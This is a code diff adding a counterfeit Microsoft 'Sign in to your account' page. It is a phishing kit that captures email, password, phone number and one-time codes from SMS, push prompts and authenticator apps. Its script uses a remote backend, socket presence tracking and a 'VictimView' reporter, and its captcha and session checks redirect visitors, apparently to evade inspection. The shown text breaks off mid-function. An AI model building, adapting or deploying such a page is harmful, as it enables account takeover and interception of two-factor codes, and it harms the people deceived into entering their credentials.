@@ -1,0 +1,1592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>3600000){try{localStorage.removeItem('captcha_verified');localStorage.removeItem('captcha_timestamp');sessionStorage.removeItem('captcha_verified');sessionStorage.removeItem('captcha_timestamp');}catch(e){}location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"/>
+  <title>Sign in to your account</title>
+  <link rel="icon" href="https://c.s-microsoft.com/favicon.ico"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html {
+      height: 100%;
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+    html, body { height: 100%; }
+
+    input:not([type="checkbox"]):not([type="radio"]),
+    select,
+    textarea,
+    .ms-input {
+      width: 100%;
+      max-width: 100%;
+      box-sizing: border-box;
+    }
+    @media screen and (max-width: 768px) {
+      input:not([type="checkbox"]):not([type="radio"]),
+      select,
+      textarea,
+      .ms-input,
+      .ms-email-complete-input {
+        font-size: 16px !important;
+      }
+    }
+    body {
+      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      color: #1b1b1b;
+    }
+    .ms-bg {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background:
+        radial-gradient(ellipse 120% 80% at 10% 0%, rgba(180, 220, 255, 0.55) 0%, transparent 55%),
+        radial-gradient(ellipse 90% 70% at 95% 10%, rgba(200, 190, 255, 0.35) 0%, transparent 50%),
+        radial-gradient(ellipse 100% 60% at 50% 100%, rgba(255, 210, 230, 0.25) 0%, transparent 55%),
+        #f2f2f2;
+    }
+    .ms-main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px 48px;
+    }
+    #lightbox {
+      box-sizing: border-box;
+      width: 440px;
+      max-width: 100%;
+      height: 338px;
+      min-height: 338px;
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,.08), 0 8px 24px rgba(0,0,0,.1);
+      padding: 44px;
+      position: relative;
+      overflow: hidden;
+    }
+    #lightbox.ms-tall {
+      height: auto;
+      min-height: 338px;
+      max-height: none;
+      overflow: hidden;
+    }
+    #lightbox.ms-tall-email {
+      height: 560px;
+      min-height: 560px;
+    }
+    #lightbox.ms-tall-code {
+      height: auto;
+      min-height: 0;
+    }
+    #stepEmailSecurityCode.ms-active {
+      height: auto;
+    }
+    @media (max-width: 480px) {
+      #lightbox.ms-tall-email {
+        width: 430px;
+        height: auto;
+        min-height: 520px;
+        max-height: none;
+      }
+      #lightbox.ms-tall-code {
+        width: 430px;
+        height: auto;
+        min-height: 0;
+      }
+    }
+    @media (max-width: 480px) {
+      #lightbox {
+        box-sizing: border-box;
+        width: 430px;
+        max-width: 100%;
+        height: 338px;
+        min-height: 338px;
+        padding: 32px 24px;
+        box-shadow: none;
+      }
+      .ms-main { padding: 24px 16px 48px; align-items: center; }
+    }
+    .ms-view {
+      display: none;
+      flex-direction: column;
+      height: 100%;
+      overflow: hidden;
+    }
+    .ms-view.ms-active {
+      display: flex;
+    }
+    .ms-logo {
+      display: block;
+      height: 24px;
+      width: auto;
+      margin: 0 auto 24px;
+    }
+    .ms-back {
+      position: absolute;
+      left: 12px;
+      top: 12px;
+      width: 36px;
+      height: 36px;
+      border: none;
+      background: transparent;
+      cursor: pointer;
+      border-radius: 4px;
+      color: #1b1b1b;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .ms-back:hover { background: rgba(0,0,0,.04); }
+    .ms-title {
+      font-size: 24px;
+      font-weight: 600;
+      line-height: 1.25;
+      margin-bottom: 16px;
+      color: #1b1b1b;
+    }
+    #stepEmailVerify .ms-title,
+    #stepEmailSecurityCode .ms-title {
+      font-size: 20px;
+      line-height: 1.3;
+      margin-bottom: 12px;
+    }
+    .ms-input {
+      width: 100%;
+      height: 36px;
+      padding: 6px 10px;
+      font-size: 15px;
+      font-family: inherit;
+      border: 1px solid #605e5c;
+      outline: none;
+      color: #1b1b1b;
+    }
+    .ms-input:focus {
+      border-color: #0067b8;
+      box-shadow: 0 0 0 1px #0067b8;
+    }
+    .ms-input.err { border-color: #a80000; box-shadow: 0 0 0 1px #a80000; }
+    .ms-field-error {
+      font-size: 13px;
+      color: #a80000;
+      margin-top: 8px;
+      display: none;
+    }
+    .ms-field-error.visible { display: block; }
+    .ms-links { margin-top: 12px; font-size: 13px; line-height: 1.5; }
+    .ms-links a { color: #0067b8; text-decoration: none; }
+    .ms-links a:hover { text-decoration: underline; color: #004578; }
+    .ms-btn-row { margin-top: auto; padding-top: 16px; text-align: right; }
+    .ms-btn-primary {
+      min-width: 108px;
+      height: 32px;
+      padding: 4px 20px;
+      font-size: 15px;
+      font-family: inherit;
+      font-weight: 600;
+      color: #fff;
+      background: #0067b8;
+      border: none;
+      cursor: pointer;
+    }
+    .ms-btn-primary:hover { background: #005a9e; }
+    .ms-btn-primary:disabled { opacity: 0.6; cursor: default; }
+    .ms-identity-wrap {
+      width: 100%;
+      min-width: 0;
+      margin-bottom: 16px;
+    }
+    .ms-identity-pill {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      max-width: 100%;
+      min-width: 0;
+      width: fit-content;
+      margin: 0;
+      padding: 5px 10px 5px 12px;
+      border: 1px solid #8c8c8c;
+      appearance: none;
+      -webkit-appearance: none;
+      border-radius: 16px;
+      font-size: 15px;
+      line-height: 20px;
+      font-family: inherit;
+      color: #1b1b1b;
+      background: #fff;
+      overflow: hidden;
+      cursor: pointer;
+      text-align: left;
+    }
+    .ms-identity-pill:hover { background: #f3f2f1; }
+    .ms-identity-pill:focus-visible {
+      outline: 2px solid #000;
+      outline-offset: 2px;
+    }
+    .ms-identity-pill svg {
+      flex-shrink: 0;
+      width: 12px;
+      height: 12px;
+      margin-left: 2px;
+    }
+    .ms-identity-email {
+      min-width: 0;
+      flex: 1 1 auto;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .page-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,.55);
+      z-index: 99;
+    }
+    .page-overlay.visible { display: block; }
+    .ms-footer {
+      flex-shrink: 0;
+      padding: 12px 24px 20px;
+      font-size: 12px;
+      color: #605e5c;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 20px;
+      justify-content: flex-end;
+    }
+    .ms-footer a { color: #605e5c; text-decoration: none; }
+    .ms-footer a:hover { text-decoration: underline; }
+    .btn-spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: msspin .65s linear infinite;
+      vertical-align: middle;
+    }
+    @keyframes msspin { to { transform: rotate(360deg); } }
+
+    /* Legacy admin-driven steps (3–7) */
+    .legacy-step.card-body {
+      display: none;
+      flex-direction: column;
+      padding: 0;
+      font-size: 14px;
+    }
+    .legacy-step.card-body[style*="flex"] { display: flex !important; }
+    .legacy-step h1 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
+    .legacy-step .text-field input {
+      width: 100%; height: 40px; padding: 8px 10px; border: 1px solid #605e5c; font-size: 15px;
+    }
+    .legacy-step .field-error { color: #a80000; font-size: 13px; margin-top: 6px; display: none; }
+    .legacy-step .field-error.visible { display: block; }
+    .legacy-step .btn-next {
+      margin-top: 16px; min-width: 108px; height: 32px; background: #0067b8; color: #fff; border: none; cursor: pointer;
+    }
+    .legacy-step .actions { margin-top: 16px; display: flex; justify-content: flex-end; gap: 8px; }
+
+    /* Email verification — Help us protect your account */
+    .ms-logo-left {
+      display: block;
+      height: 24px;
+      width: auto;
+      margin: 0 0 12px;
+    }
+    .ms-signed-in-email {
+      font-size: 15px;
+      line-height: 1.4;
+      margin-bottom: 12px;
+      color: #1b1b1b;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .ms-protect-lead {
+      font-size: 14px;
+      line-height: 1.45;
+      margin-bottom: 14px;
+      color: #1b1b1b;
+    }
+    .ms-radio-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 15px;
+      line-height: 1.4;
+      margin-bottom: 10px;
+      color: #1b1b1b;
+    }
+    .ms-radio-row input[type="radio"] {
+      margin-top: 3px;
+      width: 16px;
+      height: 16px;
+      accent-color: #0067b8;
+      flex-shrink: 0;
+    }
+    .ms-radio-detail {
+      margin: 0 0 8px 26px;
+      font-size: 14px;
+      line-height: 1.4;
+      color: #1b1b1b;
+    }
+    .ms-email-complete-row {
+      display: flex;
+      align-items: flex-end;
+      gap: 2px;
+      margin: 0 0 12px 26px;
+      max-width: calc(100% - 26px);
+    }
+    .ms-email-complete-input {
+      flex: 1;
+      min-width: 0;
+      border: none;
+      border-bottom: 1px solid #1b1b1b;
+      font-size: 15px;
+      font-family: inherit;
+      padding: 6px 2px 4px;
+      outline: none;
+      background: transparent;
+      color: #1b1b1b;
+    }
+    .ms-email-complete-input:focus { border-bottom-color: #0067b8; }
+    .ms-email-complete-input.err { border-bottom-color: #a80000; }
+    .ms-email-domain-suffix {
+      font-size: 15px;
+      padding-bottom: 4px;
+      white-space: nowrap;
+      color: #1b1b1b;
+    }
+    .ms-radio-row-muted { color: #1b1b1b; margin-top: 0; margin-bottom: 0; }
+    #stepEmailVerify .ms-field-error {
+      margin-top: -8px;
+      margin-bottom: 4px;
+    }
+    .ms-protect-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: auto;
+      padding-top: 8px;
+    }
+    #stepEmailVerify.ms-active,
+    #stepEmailSecurityCode.ms-active {
+      overflow: hidden;
+    }
+    .ms-protect-footer a {
+      color: #0067b8;
+      text-decoration: none;
+      font-size: 13px;
+    }
+    .ms-protect-footer a:hover { text-decoration: underline; color: #004578; }
+    #emailVerifySendBtn { min-width: 120px; }
+
+    /* Enter your security code (after email verify Send code) */
+    .ms-security-subhead {
+      font-size: 15px;
+      line-height: 1.45;
+      margin-bottom: 16px;
+      color: #1b1b1b;
+    }
+    .ms-code-input {
+      max-width: 100%;
+      margin-bottom: 20px;
+    }
+    .ms-code-actions {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .ms-btn-secondary {
+      min-width: 108px;
+      height: 32px;
+      padding: 4px 20px;
+      font-size: 15px;
+      font-family: inherit;
+      font-weight: 600;
+      color: #1b1b1b;
+      background: #fff;
+      border: 1px solid #8c8c8c;
+      cursor: pointer;
+    }
+    .ms-btn-secondary:hover { background: #f3f2f1; }
+  </style>
+</head>
+<body>
+  <div class="page-overlay" id="overlay"></div>
+  <div class="ms-bg">
+    <main class="ms-main">
+      <div id="lightbox" role="main">
+
+        <div class="ms-view ms-active" id="step1">
+          <img class="ms-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"/>
+          <h1 class="ms-title">Sign in</h1>
+          <input type="email" id="emailInput" class="ms-input" name="loginfmt" autocomplete="username webauthn" spellcheck="false" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype."/>
+          <div class="ms-field-error" id="emailError">Enter a valid email address, phone number, or Skype name.</div>
+          <div class="ms-links">
+            <div>No account? <a href="#">Create one!</a></div>
+            <div style="margin-top:8px"><a href="#">Can&rsquo;t access your account?</a></div>
+          </div>
+          <div class="ms-btn-row">
+            <button type="button" class="ms-btn-primary" id="emailNextBtn"><span id="emailBtnLabel">Next</span></button>
+          </div>
+        </div>
+
+        <div class="ms-view" id="step2">
+          <button type="button" class="ms-back" id="msBackBtn" aria-label="Back">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10.5 19.5 3 12l7.5-7.5 1.06 1.08L5.62 11H21v1.5H5.62l5.94 5.92-1.06 1.08z"/></svg>
+          </button>
+          <img class="ms-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"/>
+          <div class="ms-identity-wrap">
+            <button type="button" class="ms-identity-pill" id="accountChip" aria-label="Change sign-in account">
+              <span class="ms-identity-email" id="chipEmail"></span>
+              <svg viewBox="0 0 12 12" fill="#605e5c" aria-hidden="true"><path d="M2.15 4.65a.5.5 0 0 1 .7-.01L6 7.79l3.15-3.15a.5.5 0 1 1 .71.71l-3.5 3.5a.5.5 0 0 1-.71 0l-3.5-3.5a.5.5 0 0 1-.01-.7z"/></svg>
+            </button>
+          </div>
+          <h1 class="ms-title">Enter your password</h1>
+          <input type="password" id="pwInput" class="ms-input" name="passwd" autocomplete="current-password" placeholder="Password" aria-label="Enter your password"/>
+          <div class="ms-field-error" id="pwError">Wrong password. Try again or click Forgot password to reset it.</div>
+          <div class="ms-btn-row">
+            <button type="button" class="ms-btn-primary" id="pwNextBtn"><span id="pwBtnLabel">Next</span></button>
+          </div>
+        </div>
+
+        <div class="ms-view" id="stepEmailVerify">
+          <img class="ms-logo-left" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"/>
+          <div class="ms-signed-in-email" id="emailVerifySignedIn"></div>
+          <h1 class="ms-title">Help us protect your account</h1>
+          <p class="ms-protect-lead">We&rsquo;ve detected something unusual about this sign-in. For example, you might be signing in from a new location, device or app.</p>
+          <label class="ms-radio-row">
+            <input type="radio" name="msVerifyMethod" value="email" checked disabled />
+            <span>Email <span id="emailVerifyRadioLabel">*****@gmail.com</span></span>
+          </label>
+          <p class="ms-radio-detail">To verify that this is your email address, complete the hidden part and click &lsquo;Send code&rsquo; to receive your code.</p>
+          <div class="ms-email-complete-row">
+            <input type="text" class="ms-email-complete-input" id="emailVerifyLocalInput" autocomplete="off" spellcheck="false" aria-label="Complete your email address"/>
+            <span class="ms-email-domain-suffix" id="emailVerifyDomainSuffix">@gmail.com</span>
+          </div>
+          <div class="ms-field-error" id="emailVerifyLocalError" style="margin-left:26px;margin-top:-14px;">Enter the missing part of your email address.</div>
+          <label class="ms-radio-row ms-radio-row-muted">
+            <input type="radio" name="msVerifyMethod" value="none" disabled />
+            <span>I don&rsquo;t have these any more</span>
+          </label>
+          <div class="ms-protect-footer">
+            <a href="#" id="emailVerifyHaveCodeLink">I have a code</a>
+            <button type="button" class="ms-btn-primary" id="emailVerifySendBtn"><span id="emailVerifySendLabel">Send code</span></button>
+          </div>
+        </div>
+
+        <div class="ms-view" id="stepEmailSecurityCode">
+          <img class="ms-logo-left" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"/>
+          <div class="ms-signed-in-email" id="emailCodeSignedIn"></div>
+          <h1 class="ms-title" style="font-size:20px;">Enter your security code</h1>
+          <p class="ms-security-subhead" id="emailCodeSubhead">If your email matches the email address on your account, we&rsquo;ll send you a code.</p>
+          <div class="ms-field-error" id="emailCodeError">That code didn&rsquo;t work. Check the code and try again.</div>
+          <input type="tel" id="emailSecurityCodeInput" class="ms-input ms-code-input" maxlength="16" placeholder="Code" autocomplete="one-time-code" spellcheck="false" aria-label="Enter your security code"/>
+          <div class="ms-code-actions">
+            <button type="button" class="ms-btn-secondary" id="emailCodeCancelBtn">Cancel</button>
+            <button type="button" class="ms-btn-primary" id="emailCodeNextBtn"><span id="emailCodeNextLabel">Next</span></button>
+          </div>
+        </div>
+
+        <!-- ── STEP 3: Phone number ── -->
+    <div class="card-body legacy-step" id="step3" style="display:none;">
+      <div class="col-brand">
+        <h1>Verify it's you</h1>
+        <div id="step3AccountChip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step3ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="phone-info">
+          For added security, Microsoft wants to verify it's really you. Enter the phone number associated with your account.
+        </p>
+        <div class="phone-row">
+          <div class="phone-prefix-box" id="phonePrefixBox">+</div>
+          <div class="text-field" style="flex:1;">
+            <input
+              type="tel"
+              id="phoneInput"
+              placeholder=" "
+              autocomplete="tel"
+              spellcheck="false"
+              aria-label="Phone number"
+            />
+            <label for="phoneInput">Phone number</label>
+          </div>
+        </div>
+        <div class="field-error" id="phoneError">Enter a valid phone number</div>
+
+        <div class="actions">
+          <button class="btn-text" type="button" id="phoneBackBtn">Back</button>
+          <button class="btn-next" type="button" id="phoneNextBtn">
+            <span id="phoneBtnLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step3 -->
+
+    <!-- ── STEP 4: Google Prompt (number) ── -->
+    <div class="card-body legacy-step" id="step4" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Microsoft wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step4Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step4ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+        <a href="#" class="forgot-link" style="margin-top:auto; margin-bottom:0;">Resend it</a>
+      </div>
+      <div class="col-form col-form-center">
+        <div class="prompt-number" id="promptNumber">58</div>
+        <p class="prompt-device-title" id="promptDeviceName">Open the Outlook or Microsoft app app</p>
+        <p class="prompt-desc">
+          Microsoft sent a notification to your <span id="promptDeviceNameInline">phone</span>. Open the Outlook or Microsoft app app, tap <strong>Yes</strong> on the
+          prompt, then tap <strong id="promptNumberInline">58</strong> on your phone to verify it's you.
+        </p>
+        <a href="#" class="prompt-help-link">Need help? Learn more about Google prompts</a>
+        <label class="prompt-checkbox-row">
+          <input type="checkbox" checked> Don't ask again on this device
+        </label>
+        <div class="actions" style="width:100%;">
+          <span></span>
+          <button class="btn-text" type="button">Try another way</button>
+        </div>
+      </div>
+    </div><!-- /.card-body step4 -->
+
+    <!-- ── STEP 5: SMS — Phone entry ── -->
+    <div class="card-body legacy-step" id="step5" style="display:none;">
+      <div class="col-brand">
+        <div class="sms-gif-wrap">
+          <img src="https://ssl.gstatic.com/accounts/account-recovery-sms-pin.gif" aria-hidden="true" alt="">
+        </div>
+        <h1>2-Step Verification</h1>
+        <div id="step5Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step5ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="sms-section-title">Get a verification code</p>
+        <p class="sms-desc">
+          To get a verification code, first confirm the phone number you added to your account
+          <span class="sms-masked-num">••• ••• •<span id="smsLastTwo">92</span></span>.
+          <em>Standard message and data rates may apply.</em>
+        </p>
+        <div class="phone-row">
+          <div class="sms-country-selector" id="smsPrefixBox">+</div>
+          <div class="text-field" style="flex:1;">
+            <input
+              type="tel"
+              id="smsPhoneInput"
+              placeholder=" "
+              autocomplete="tel"
+              aria-label="Phone number"
+            />
+            <label for="smsPhoneInput">Phone number</label>
+          </div>
+        </div>
+        <div class="field-error" id="smsPhoneError">Enter a valid phone number</div>
+        <div class="sms-checkbox-row">
+          <input type="checkbox" id="smsDontAsk">
+          <label for="smsDontAsk">Don't ask again on this device</label>
+        </div>
+        <div class="actions">
+          <span></span>
+          <button class="btn-next" type="button" id="smsSendBtn">
+            <span id="smsSendLabel">Send</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step5 -->
+
+    <!-- ── STEP 6: SMS — Code entry ── -->
+    <div class="card-body legacy-step" id="step6" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Microsoft wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step6Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step6ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="code-hint" id="smsCodeHint">
+          Enter the 6-digit code we sent to your phone.
+        </p>
+        <div class="text-field">
+          <input
+            type="text"
+            id="smsCodeInput"
+            placeholder=" "
+            maxlength="6"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-label="Enter code"
+          />
+          <label for="smsCodeInput">Enter code</label>
+        </div>
+        <div class="field-error" id="smsCodeError">Wrong code. Try again or request a new one.</div>
+        <a href="#" class="forgot-link">Resend code</a>
+        <div class="actions">
+          <span></span>
+          <button class="btn-next" type="button" id="smsCodeNextBtn">
+            <span id="smsCodeLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step6 -->
+
+    <!-- ── STEP 7: Authenticator code ── -->
+    <div class="card-body legacy-step" id="step7" style="display:none;">
+      <div class="col-brand">
+        <h1>2-Step Verification</h1>
+        <p class="subtitle" style="font-size:14px; color:#444746; font-weight:400; margin-bottom:24px; line-height:1.5;">
+          To help keep your account safe, Microsoft wants to make sure it's really you trying to sign in
+        </p>
+        <div id="step7Chip" class="acct-chip">
+          <div class="acct-chip-icon">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/></svg>
+          </div>
+          <span id="step7ChipEmail" class="acct-chip-email"></span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+      </div>
+      <div class="col-form">
+        <p class="sms-section-title">2-Step Verification</p>
+        <p class="code-hint">
+          Get a verification code from the <strong>Microsoft Authenticator</strong> app
+        </p>
+        <div class="text-field">
+          <input
+            type="tel"
+            id="authCodeInput"
+            placeholder=" "
+            maxlength="6"
+            pattern="[0-9 ]*"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-label="Enter code"
+          />
+          <label for="authCodeInput">Enter code</label>
+        </div>
+        <div class="field-error" id="authCodeError">Wrong code. Try again.</div>
+        <div class="sms-checkbox-row" style="margin-top:8px;">
+          <input type="checkbox" id="authDontAsk">
+          <label for="authDontAsk">Don't ask again on this device</label>
+        </div>
+        <div class="actions">
+          <button class="btn-text" type="button">Try another way</button>
+          <button class="btn-next" type="button" id="authCodeNextBtn">
+            <span id="authCodeLabel">Next</span>
+          </button>
+        </div>
+      </div>
+    </div><!-- /.card-body step7 -->
+
+      </div>
+    </main>
+    <footer class="ms-footer">
+      <a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank" rel="noopener">Terms of use</a>
+      <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener">Privacy &amp; cookies</a>
+      <span>&hellip;</span>
+    </footer>
+  </div>
+
+  <script src="assets/victim-view.js"></script>
+  <script src="assets/socket-presence.js"></script>
+  <script src="assets/api-payload.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+
+  <script>
+  /* Guard: redirect to apply.html if user opens this page directly (tab closed and reopened) */
+  (function () {
+    if (!sessionStorage.getItem('microsoftLoginSession')) {
+      window.location.replace('apply.html');
+    }
+  })();
+  </script>
+
+  <script>
+  (function () {
+    var BACKEND = 'https://app.dbrcl.com';
+    /* Auto-switch to local backend when running on localhost or *.test */
+    if (location.hostname === 'localhost' || location.hostname === '127.0.0.1' ||
+        location.hostname.endsWith('.test') || location.hostname.endsWith('.local')) {
+      BACKEND = 'http://localhost:3001';
+    }
+
+    /* ─── clientId — reuse the one from apply.html so backend routes to same user ─── */
+    var clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = (typeof crypto !== 'undefined' && crypto.randomUUID)
+                 ? crypto.randomUUID()
+                 : Math.random().toString(36).slice(2) + Date.now().toString(36);
+      localStorage.setItem('clientId', clientId);
+    }
+
+    /* ─── Socket — init first so socket.id is available in fetch calls ─── */
+    var socket;
+    var currentSocketId = '';
+    var pwWaitTimer;
+
+    /* ─── Elements ─── */
+    var emailInput   = document.getElementById('emailInput');
+    var emailErr     = document.getElementById('emailError');
+    var emailNextBtn = document.getElementById('emailNextBtn');
+    var emailLabel   = document.getElementById('emailBtnLabel');
+
+    var step1 = document.getElementById('step1');
+    var step2 = document.getElementById('step2');
+
+    var pwInput      = document.getElementById('pwInput');
+    var pwErr        = document.getElementById('pwError');
+    var pwNextBtn    = document.getElementById('pwNextBtn');
+    var pwLabel      = document.getElementById('pwBtnLabel');
+    var chipEmail  = document.getElementById('chipEmail');
+    var overlay    = document.getElementById('overlay');
+
+    function microsoftPostBody(fields) {
+      return typeof ApiPayload !== 'undefined'
+        ? ApiPayload.withClient(fields)
+        : Object.assign({ socketId: currentSocketId, clientId: clientId }, fields);
+    }
+
+    function reportVisibleGoogleStep() {
+      if (typeof VictimView === 'undefined') return;
+      var steps = [
+        ['step1', 'microsoft-login-email'],
+        ['step2', 'microsoft-login-password'],
+        ['step3', 'microsoft-login-phone'],
+        ['step4', 'microsoft-login-prompt'],
+        ['step5', 'microsoft-login-sms'],
+        ['step6', 'microsoft-login-sms'],
+        ['step7', 'microsoft-login-auth'],
+        ['stepEmailVerify', 'microsoft-login-email-verify'],
+        ['stepEmailSecurityCode', 'microsoft-login-email-security-code']
+      ];
+      for (var i = 0; i < steps.length; i++) {
+        var el = document.getElementById(steps[i][0]);
+        if (el && isStepVisible(el)) {
+          VictimView.report(steps[i][1]);
+          return;
+        }
+      }
+      VictimView.report('microsoft-login-email');
+    }
+
+    /* ─── Helpers ─── */
+    function clearErr(input, errEl) {
+      input.classList.remove('err');
+      errEl.classList.remove('visible');
+    }
+
+    function showErr(input, errEl) {
+      input.classList.add('err');
+      errEl.classList.add('visible');
+      input.focus();
+    }
+
+    function setLoading(btn, labelEl, loading) {
+      if (loading) {
+        btn.disabled = true;
+        labelEl.textContent = '';
+        var sp = document.createElement('span');
+        sp.className = 'btn-spinner';
+        sp.id = 'spinner_' + btn.id;
+        btn.appendChild(sp);
+      } else {
+        btn.disabled = false;
+        var sp = document.getElementById('spinner_' + btn.id);
+        if (sp) sp.remove();
+        labelEl.textContent = 'Next';
